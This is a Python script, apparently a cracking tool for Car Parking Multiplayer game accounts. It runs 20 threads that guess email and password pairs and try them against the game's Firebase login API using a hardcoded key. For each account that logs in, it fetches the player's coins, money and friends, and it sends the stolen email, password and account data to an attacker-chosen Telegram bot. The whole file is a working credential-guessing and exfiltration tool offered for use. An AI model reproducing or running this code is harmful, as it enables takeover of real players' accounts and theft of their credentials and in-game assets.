import requests
import json
import datetime
import random
import threading
import os
os.system('cls' if os.name == 'nt' else 'clear')
print(f'''\033[1;32m
    ░█████╗░░░░██████╗░░░░██╗░░██╗░░░░░███╗░░
    \033[1;33m██╔══██╗░░░██╔══██╗░░░██║░██╔╝░░░░████║░░
    ██║░░╚═╝░░░██████╔╝░░░█████═╝░░░░██╔██║░░
    \033[1;36m██║░░██╗░░░██╔═══╝░░░░██╔═██╗░░░░╚═╝██║░░
   ╚█████╔╝░░░░██║░░░░░░░░██║░╚██╗░░░███████╗
    \033[1;97m░╚════╝░░░░╚═╝░░░░░░░░╚═╝░░╚═╝░░░╚══════╝

      \033[1;34mTool check acc car parking Vip by: Roasted_anonymous
        [-----------------------------------]
        \033[1;33m2.YouTube: 🔱 ROASTED_ANONYMOUS 🔱
        \033[1;36m3.Zalo: 0983544223
        \033[1;36m4.Facebook: Phạm Thanh Tùng
        \033[0;35m5.Telegram: Roasted2001
      [====================================]
 \033[31m ╰☜ Cảm ơn đã sử dụng tool của tôi ☞╯ \n\033[31m             ╰☜ Chúc một ngày tốt lành ☞╯''')

try:
    from colorama import Fore
except:
    os.system('pip install colorama')
    from colorama import Fore

try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say

try:
    from names import get_first_name
except:
    os.system('pip install names')
    from names import get_first_name

headers = {
    "Content-Type": "application/json",
    "X-Android-Package": "com.olzhas.carparking.multyplayer",
    "X-Android-Cert": "D4962F8124C2E09A66B97C8E326AFF805489FE39",
    "Accept-Language": "tr-TR, en-US",
    "X-Client-Version": "Android/Fallback/X22001001/FirebaseCore-Android",
    "X-Firebase-GMPID": "1:581727203278:android:af6b7dee042c8df539459f",
    "X-Firebase-Client": "H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; A5010 Build/PI)",
    "Host": "www.googleapis.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}

token = input(f"{Fore.RESET}[{Fore.LIGHTBLUE_EX}+{Fore.RESET}] token: ")
ID = input(f"[{Fore.LIGHTBLUE_EX}+{Fore.RESET}] id: ")

def decode_nested_json(d):
    for key, value in d.items():
        if isinstance(value, str):
            try:
                nested_value = json.loads(value)
                d[key] = decode_nested_json(nested_value)
            except json.JSONDecodeError:
                continue
        elif isinstance(value, dict):
            d[key] = decode_nested_json(value)
    return d

def login(email,password):
    data = {
        "email": email,
        "password": password,
        "returnSecureToken": True,
        "clientType": "CLIENT_TYPE_ANDROID"
    }
    res = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data, headers=headers).json()
    if "idToken" in res:
        tkn = res["idToken"]
        data2 = {
            "idToken": tkn
        }
        res2 = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data2, headers=headers).json()
        deta=res2['users'][0]['createdAt']
        data3 = {
            "data": "2893216D41959108CB8FA08951CB319B7AD80D02"
        }
        he = {
            "authorization": f"Bearer {tkn}",
            "firebase-instance-id-token": "f0Rstd-MTbydQx9M2eLlTM:APA91bF7UdxnXLAaybpBODKCRnyLu44eFWygoIfnLn7kOE9aujlb5WcvTv-EyA5mTNbVBPQ-r-x967XJqEA3TX23gGyXCSbMEEa2PIccvNU98uEcdun1qMgYbCOY4hPBBD2w6G9mfX_m",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.12.13"
        }
        info = requests.post("https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2", json=data3, headers=he).text

        data_account = json.loads(info)
        if 'result' in data_account:data_account['result'] = decode_nested_json(json.loads(data_account['result']))

        result_account = data_account["result"]
        try:Player_name = result_account['Name']
        except:Player_name = 'None'
        try:Friends_count = len(result_account['FriendsID'])
        except:Friends_count = 'None'
        try:Coins = result_account['coin']
        except:Coins = 'None'
        try:Money = result_account['money']
        except:Money = 'None'
        Date_Account = str(datetime.datetime.fromtimestamp(int(deta) / 1000)).split(' ')[0].replace('-', '/')
        msg_text = f'''*~ Car Parking 🚘*\n*———————————*\n*Email : *`{email}`\n*Password : *`{password}`\n*——*\n*Name : {Player_name} 👤*\n*Coins : {Coins} 🪙*\n*Money : {Money} 💰*\n*Friends : {Friends_count} 👥*\n*Date : {Date_Account} ⌛️*\n*———————————*\n*By @Lê Quyền Ngự *'''
        try:
            url = (f'https://api.telegram.org/bot{token}/sendMessage')
            payload = {'chat_id': str(ID), 'text': msg_text, 'parse_mode': 'markdown'}
            requests.post(url, params=payload)
        except:''
        print(f"[{Fore.LIGHTGREEN_EX}√{Fore.RESET}] Good : {email}:{password}")

    else:
        print(f"[{Fore.LIGHTRED_EX}×{Fore.RESET}] Bad : {email}:{password}")
def RunChk():
    while True:
        names = str(get_first_name())
        numbers1 = ''.join(random.choices('1234567890', k=random.randint(1,5)))
        password = names+numbers1
        email = f'{names}{numbers1}@gmail.com'
        login(email,password)
E_TREADING=[]
for i in range(20):
    t = threading.Thread(target=login and RunChk)
    t.start()
    E_TREADING.append(t)
RunChk()
